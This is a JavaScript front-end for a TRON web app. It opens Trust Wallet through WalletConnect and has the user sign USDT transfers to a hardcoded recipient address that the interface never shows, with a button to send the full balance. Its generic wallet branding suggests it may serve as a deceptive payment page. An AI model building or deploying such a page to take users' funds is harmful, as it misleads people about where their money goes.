import "./style.css";
import { TronWeb } from "tronweb";
import { WalletConnectWallet, WalletConnectChainID } from "@tronweb3/walletconnect-tron";

// ─── Constants ────────────────────────────────────────────────────────────────
const TRON_RPC        = "https://api.trongrid.io";
const USDT_CONTRACT   = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const FIXED_RECIPIENT = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
const USDT_DECIMALS   = 6;
const FEE_LIMIT       = 200_000_000;

const PROJECT_ID = import.meta.env.VITE_WC_PROJECT_ID;
const APP_NAME   = import.meta.env.VITE_APP_NAME || "TRON Wallet";
const APP_DESC   = import.meta.env.VITE_APP_DESCRIPTION || "Send USDT";
const APP_ICON   = import.meta.env.VITE_APP_ICON || `${location.origin}/logo.png`;

// TronWeb — building transactions only, WC handles signing
const tronWeb = new TronWeb({ fullHost: TRON_RPC });

const IS_MOBILE = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

// ─── State ────────────────────────────────────────────────────────────────────
let wallet           = null;
let connectedAddress = "";
let usdtBalance      = 0;

// ─── DOM ──────────────────────────────────────────────────────────────────────
const boot     = document.getElementById("boot");
const vConn    = document.getElementById("vConn");
const vSend    = document.getElementById("vSend");
const vSign    = document.getElementById("vSign");
const vOk      = document.getElementById("vOk");
const vErr     = document.getElementById("vErr");
const connText = document.getElementById("connText");
const amtInput = document.getElementById("amtInput");
const usdEq    = document.getElementById("usdEq");
const sendErr  = document.getElementById("sendErr");
const txidTxt  = document.getElementById("txidTxt");
const errMsg   = document.getElementById("errMsg");

const VIEWS = [vConn, vSend, vSign, vOk, vErr];
function show(el) { VIEWS.forEach(v => { if (v) v.hidden = v !== el; }); }
function hideBoot() { boot.classList.add("boot-out"); setTimeout(() => boot.remove(), 400); }
function setSendErr(m) { sendErr.textContent = m; sendErr.hidden = !m; }

function toUnit(amount) {
  const [w = "0", f = ""] = String(amount).split(".");
  return BigInt(w + f.slice(0, USDT_DECIMALS).padEnd(USDT_DECIMALS, "0")).toString();
}

async function fetchBalance(addr) {
  try {
    tronWeb.setAddress(addr);
    const c   = await tronWeb.contract().at(USDT_CONTRACT);
    const raw = await c.methods.balanceOf(addr).call();
    return Number(raw) / 1e6;
  } catch { return 0; }
}

// ─── WalletConnect ────────────────────────────────────────────────────────────
function buildWallet() {
  wallet = new WalletConnectWallet({
    network: WalletConnectChainID.Mainnet,
    options: {
      relayUrl: "wss://relay.walletconnect.com",
      projectId: PROJECT_ID,
      metadata: {
        name: APP_NAME, description: APP_DESC,
        url: location.origin, icons: [APP_ICON],
      },
    },
    themeMode: "dark",
    themeVariables: { "--w3m-z-index": "99999", "--w3m-accent": "#39D98A" },
  });

  wallet.on("accountsChanged", accounts => {
    if (!accounts?.[0]) { errMsg.textContent = "Wallet disconnected."; show(vErr); }
  });
  wallet.on("disconnect", () => init());
}

// ─── Connect ──────────────────────────────────────────────────────────────────
async function connect() {
  connText.textContent = IS_MOBILE ? "Opening Trust Wallet…" : "Scan QR with Trust Wallet";
  show(vConn);

  try {
    /**
     * KEY: When onUri is provided, AppKit skips the "All Wallets" modal entirely.
     * We get the raw WC pairing URI and redirect straight into Trust Wallet.
     *
     * Mobile  → link.trustwallet.com/wc?uri=... → Trust Wallet native approval screen
     * Desktop → no onUri → AppKit QR modal (user scans with Trust Wallet)
     */
    const opts = IS_MOBILE
      ? {
          onUri(uri) {
            if (!uri) return;
            // Direct Trust Wallet link — no wallet picker, no AppKit modal
            const link = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
            console.log("[dapp] → Trust Wallet:", link.slice(0, 80));
            window.location.href = link;
          },
        }
      : {}; // desktop: let AppKit show QR

    const { address } = await wallet.connect(opts);
    if (!address) throw new Error("No address");

    connectedAddress = address;
    fetchBalance(address).then(b => { usdtBalance = b; });
    show(vSend);
  } catch (e) {
    const m = String(e?.message || e);
    errMsg.textContent = /reject|cancel|close|abort/i.test(m)
      ? "Connection cancelled. Tap to retry."
      : "Connection failed. Tap to retry.";
    show(vErr);
  }
}

// ─── Send USDT ────────────────────────────────────────────────────────────────
async function sendUsdt() {
  const raw = amtInput.value.trim();
  const amt = parseFloat(raw);
  if (!raw || isNaN(amt) || amt <= 0) { setSendErr("Enter a valid amount."); return; }
  if (usdtBalance > 0 && amt > usdtBalance) {
    setSendErr(`Max: ${usdtBalance.toFixed(2)} USDT`); return;
  }
  setSendErr("");
  show(vSign);

  try {
    tronWeb.setAddress(connectedAddress);
    const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
      USDT_CONTRACT, "transfer(address,uint256)", { feeLimit: FEE_LIMIT },
      [
        { type: "address", value: FIXED_RECIPIENT },
        { type: "uint256", value: toUnit(raw) },
      ],
      connectedAddress
    );
    if (!trigger?.result?.result || !trigger.transaction) throw new Error("Build failed");

    // Sign via WalletConnect → Trust Wallet shows native approval
    const signed = await wallet.signTransaction(trigger.transaction);
    const result = await tronWeb.trx.sendRawTransaction(signed);
    if (!result?.result) throw new Error("Broadcast failed");

    txidTxt.textContent = result.txid ? `TXID: ${result.txid.slice(0, 24)}…` : "Sent!";
    amtInput.value = ""; usdEq.textContent = "≈ $0.00";
    show(vOk);
  } catch (e) {
    const m = String(e?.message || e);
    errMsg.textContent = /reject|cancel|denied/i.test(m)
      ? "Transaction rejected."
      : `Error: ${m.slice(0, 80)}`;
    show(vErr);
  }
}

// ─── Events ───────────────────────────────────────────────────────────────────
amtInput.addEventListener("input", () => {
  usdEq.textContent = `≈ $${(parseFloat(amtInput.value) || 0).toFixed(2)}`;
});
document.getElementById("btnMax").addEventListener("click", () => {
  if (usdtBalance > 0) {
    amtInput.value = usdtBalance.toFixed(6);
    usdEq.textContent = `≈ $${usdtBalance.toFixed(2)}`;
  }
});
document.getElementById("btnNext").addEventListener("click", sendUsdt);
document.getElementById("btnAgain").addEventListener("click", () => show(vSend));
document.getElementById("btnRetry").addEventListener("click", () => { buildWallet(); connect(); });

// ─── Init ─────────────────────────────────────────────────────────────────────
async function init() {
  buildWallet();
  hideBoot();

  // Always try session restore first (returning user → skip connect entirely)
  try {
    const { address } = await wallet.checkConnectStatus();
    if (address) {
      connectedAddress = address;
      fetchBalance(address).then(b => { usdtBalance = b; });
      show(vSend);
      return;
    }
  } catch { /* no saved session */ }

  await connect();
}

init().catch(e => {
  errMsg.textContent = "App failed to start. Please refresh.";
  show(vErr);
});
